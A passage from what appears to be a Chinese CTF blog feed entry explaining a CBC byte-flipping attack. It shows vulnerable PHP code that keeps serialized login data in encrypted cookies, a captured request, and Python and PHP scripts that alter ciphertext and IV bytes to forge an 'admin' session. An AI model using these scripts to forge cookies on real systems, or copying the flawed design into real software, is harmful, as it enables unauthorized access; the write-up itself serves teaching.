class="built_in">return</span> <span class="variable">$random_iv</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> login(<span class="variable">$info</span>)&#123;</span><br><span class="line">    <span class="variable">$iv</span> = get_random_iv();</span><br><span class="line">    <span class="variable">$plain</span> = serialize(<span class="variable">$info</span>);</span><br><span class="line">    <span class="variable">$cipher</span> = openssl_encrypt(<span class="variable">$plain</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">'username'</span>] = <span class="variable">$info</span>[<span class="string">'username'</span>];</span><br><span class="line">    setcookie(<span class="string">"iv"</span>, base64_encode(<span class="variable">$iv</span>));</span><br><span class="line">    setcookie(<span class="string">"cipher"</span>, base64_encode(<span class="variable">$cipher</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">check_login</span></span>()&#123;</span><br><span class="line">    <span class="keyword">if</span>(isset(<span class="variable">$_COOKIE</span>[<span class="string">'cipher'</span>]) &amp;&amp; isset(<span class="variable">$_COOKIE</span>[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">        <span class="variable">$cipher</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">'cipher'</span>]);</span><br><span class="line">        <span class="variable">$iv</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">"iv"</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$plain</span> = openssl_decrypt(<span class="variable">$cipher</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>))&#123;</span><br><span class="line">            <span class="variable">$info</span> = unserialize(<span class="variable">$plain</span>) or die(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode(<span class="variable">$plain</span>).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">'username'</span>] = <span class="variable">$info</span>[<span class="string">'username'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">show_homepage</span></span>()&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">"username"</span>]===<span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;hello '</span>.<span class="variable">$_SESSION</span>[<span class="string">'username'</span>].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们登录名 admiz 密码 bb 的 COOKIE 信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: 47.93.190.246:49168</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 40</span><br><span class="line">Referer: http://47.93.190.246:49168/index.php</span><br><span class="line">Cookie: PHPSESSID=7nld2kvg1t560mtvuniqo63u02; iv=KYVIlJkfaja2cM8pENnLDg%3D%3D; cipher=3TFLhFRlhpfCeag8v7t% 2BtsVZnK%2Bl5YbtAHidL7blfvJMKe11Mwc% 2FBcFvys1PUmX51WYas4LuK62qXaSWihjHwQ%3D%3D </span><br><span class="line">Connection: close </span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure></p><p>尝试更改 iv 或 cipher 的单个字节<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YToyOntzOjg6InVzZXJuYYLHOrSKF5f/2bmVuBfm/45zOjg6InBhc3EXb3JkIjtzOjI6 ImJiIjt9</span><br></pre></td></tr></table></figure></p><p>BASE64 解码看一下信息，发现序列完全被破坏：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:<span class="string">"usernaÇ:´ÿÙ¹¸æÿs:8:"</span>pasqord<span class="string">";s:2:"</span>bb<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure></p><p>再换个字节：a:2:{s:8:”username”;s:5:”admiz”;ÚJW¹¼=;o·$YL::”bb”;} 反序列化失败。 </p><p>我们要修改 admiz 为 admin 先分组，我们只关心前两组<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一组： a:2:&#123;s:8:<span class="string">"userna </span></span><br><span class="line"><span class="string">第二组： me"</span>;s:5:<span class="string">"admiz"</span>;</span><br></pre></td></tr></table></figure></p><p>z 位于第二组第 14 个字节，为改变 z 我们要改变第一组第 14 个字节<br>我们将其异或掉 z,再异或以 n。<br>代码如下：</p><p>python版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import base64,urllib2</span><br><span class="line">cipher=base64.b64decode(urllib2.unquote(<span class="string">"3TFLhFRlhpfCe ag8v7t%2BtsVZnK%2Bl5YbtAHidL7blfvJMKe11Mwc% 2FBcFvys1PUmX51WYas4LuK62qXaSWihjHwQ%3D%3D"</span>)) newcipher=cipher[0:13]+chr(ord(cipher[13])^ord(<span class="string">'z'</span>)^or d(<span class="string">'n'</span>))+cipher[14:] newcipher=urllib2.quote(base64.b64encode(newcipher)) </span><br><span class="line"><span class="built_in">print</span> newcipher</span><br></pre></td></tr></table></figure></p><p>php版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$cipher</span> = <span class="string">"3TFLhFRlhpfCeag8v69+tsVZnK+l5YbtAHidL7blfvJMKe11Mwc/BcFvys1PUmX51WYas4LuK62qXaSWihjHwQ=="</span>;</span><br><span class="line"><span class="variable">$cipher</span> = base64_decode(<span class="variable">$cipher</span>);</span><br><span class="line"><span class="variable">$cipher</span>[9] = chr(ord(<span class="variable">$cipher</span>[9]) ^ ord(<span class="string">"q"</span>) ^ ord (<span class="string">"a"</span>));</span><br><span class="line"><span class="variable">$newcipher</span> = base64_encode(<span class="variable">$cipher</span>);</span><br><span class="line"><span class="variable">$newcipher1</span> = urlencode(<span class="variable">$newcipher</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$newcipher</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$newcipher1</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3TFLhFRlhpfCeag8v69%2BtsVZnK% 2Bl5YbtAHidL7blfvJMKe11Mwc/BcFvys1PUmX51WYas4LuK62qXaS WihjHwQ%3D%3D</span><br></pre></td></tr></table></figure></p><p>将此字符串作新的 cipher 值与原 iv 值一起提交返回如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;base64 _decode(<span class="string">'GM6nRG1acpWMpWWr1Wz8Cm1lIjtzOjU6ImFkbWluIjtzO jg6InBhc3N3b3JkIjtzOjI6ImJiIjt9'</span>) can<span class="string">'t unserialize&lt;/p&gt;</span></span><br></pre></td></tr></table></figure></p><p>Base64解码得到<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Î§DmZr¥e«Õlü me<span class="string">";s:5:"</span>admin<span class="string">";s:8:"</span>password<span class="string">";s:2:"</span>bb<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure></p><p>发现序列完全被破坏, 反序列化失败。 原因是第一个块数据（16字节）被破坏了。因为要 username 要等于 admin 所以不能利用文章（0x03一个练习中）里的说的填充字符。<br>又因为是第一个块数据被破坏，第一个块数据是和 IV 有关，所以只要将在 CBC 字符翻转攻击，得到新的 IV 就可以修复第一块数据, 我们将 IV 值异或掉 data 的前16字节（用返回的 Base64 解码的明文信息 data），再异或我们要明文<br>代码如下：</p><p>python版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import base64,urllib2</span><br><span class="line">first_16Bytes=<span class="string">'a:2:&#123;s:8:"userna'</span></span><br><span class="line">data=base64.b64decode(urllib2.unquote(<span class="string">"GM6nRG1acpWMpWWr1Wz8Cm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjI6ImJiIjt9"</span>))</span><br><span class="line">iv=base64.b64decode(urllib2.unquote(<span class="string">"KYVIlJkfaja2cM8pENnLDg%3D%3D"</span>))</span><br><span class="line">newiv=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(16):</span><br><span class="line">    newiv+=chr(ord(first_16Bytes[i])^ord(iv[i])^ord(data[i])) </span><br><span class="line"><span class="built_in">print</span> urllib2.quote(base64.b64encode(newiv))</span><br></pre></td></tr></table></figure></p><p>php版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$first_16Bytes</span>=<span class="string">'a:2:&#123;s:8:"userna'</span>;</span><br><span class="line"><span class="variable">$cipher</span> = base64_decode(<span class="string">'GM6nRG1acpWMpWWr1Wz8Cm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjI6ImJiIjt9'</span>);</span><br><span class="line"><span class="variable">$iv</span>=base64_decode(<span class="string">'KYVIlJkfaja2cM8pENnLDg=='</span>);</span><br><span class="line"><span class="variable">$newiv</span>=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;16;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$newiv</span>.=chr(ord(<span class="variable">$first_16Bytes</span>[<span class="variable">$i</span>])^ord(<span class="variable">$iv</span>[<span class="variable">$i</span>])^ord(<span class="variable">$cipher</span>[<span class="variable">$i</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$newiv</span> = base64_encode(<span class="variable">$newiv</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$newiv</span>;</span><br><span class="line"><span class="variable">$newiv</span> = urlencode(<span class="variable">$newiv</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$newiv</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CBC 字节翻转攻击原理和例题&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://archimesan.me/categories/CTF/"/>
    
      <category term="Web" scheme="http://archimesan.me/categories/CTF/Web/"/>
    
    
      <category term="cbc" scheme="http://archimesan.me/tags/cbc/"/>
    
  </entry>
  
</feed>
